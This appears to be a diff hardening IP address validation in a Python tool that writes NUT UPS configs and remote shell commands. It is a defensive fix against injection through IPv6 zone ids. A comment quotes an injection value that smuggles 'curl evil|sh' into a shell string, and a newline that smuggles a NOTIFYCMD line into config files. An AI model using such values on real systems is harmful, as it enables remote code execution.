@@ -65,13 +65,28 @@ def valid_shutdown_cmd(cmd: str) -> bool:
     return '"' not in cmd and _CMD_CTRL_RE.search(cmd) is None
 
 
+# An IPv6 zone id names an interface (``fe80::1%eth0``). ``ipaddress`` accepts ANY
+# text after the ``%`` — ``;``, ``$(...)``, ``|``, a newline — so a bare parse let
+# ``fe80::1%x;curl evil|sh`` through to the remote ``upsc`` shell string in
+# :func:`verify_secondary` and a ``%x\nNOTIFYCMD ...`` into upsmon.conf/upsd.conf.
+_IP_SCOPE_RE = re.compile(r"^[A-Za-z0-9_.-]+$")
+
+
 def valid_ip(value: str) -> bool:
-    """True iff ``value`` is a valid IPv4/IPv6 literal. PURE."""
+    """True iff ``value`` is a valid IPv4/IPv6 literal. PURE.
+
+    Surrounding spaces are tolerated (callers strip), but no control character may
+    appear anywhere and a zone id must be interface-name shaped: every caller
+    interpolates the value into a shell command or a NUT config line.
+    """
+    if _CMD_CTRL_RE.search(value):
+        return False
     try:
-        ipaddress.ip_address(value.strip())
+        addr = ipaddress.ip_address(value.strip())
     except ValueError:
         return False
-    return True
+    scope = getattr(addr, "scope_id", None)
+    return scope is None or bool(_IP_SCOPE_RE.match(scope))
 
 
 def valid_ipv4(value: str) -> bool:
@@ -84,6 +99,8 @@ def valid_ipv4(value: str) -> bool:
     from the ``$SSH_CONNECTION`` fallback on a v6-reachable secondary) rendered a
     file the kernel will not load.
     """
+    if _CMD_CTRL_RE.search(value):
+        return False
     try:
         return isinstance(ipaddress.ip_address(value.strip()), ipaddress.IPv4Address)
     except ValueError:
@@ -289,7 +306,13 @@ def upsert_upsd_listen(text: str, lan_ip: str, port: int = 3493) -> tuple[str, b
 
     Loopback always exists before networking does, so keeping it in the block
     makes ``upsd`` survive an early boot and keeps local clients working.
+
+    Raises ``ValueError`` for an ``lan_ip`` that is not a bare address: it is written
+    into a root-owned config, and ``deploy/repair-upsd-listen.sh`` reaches here
+    straight from an environment variable.
     """
+    if not valid_ip(lan_ip) or lan_ip != lan_ip.strip():
+        raise ValueError(f"not a bare IP address: {lan_ip!r}")
     lan_line = f"LISTEN {lan_ip} {port}"
     loopback_line = f"LISTEN 127.0.0.1 {port}"
     stripped = _strip_managed_block(text)
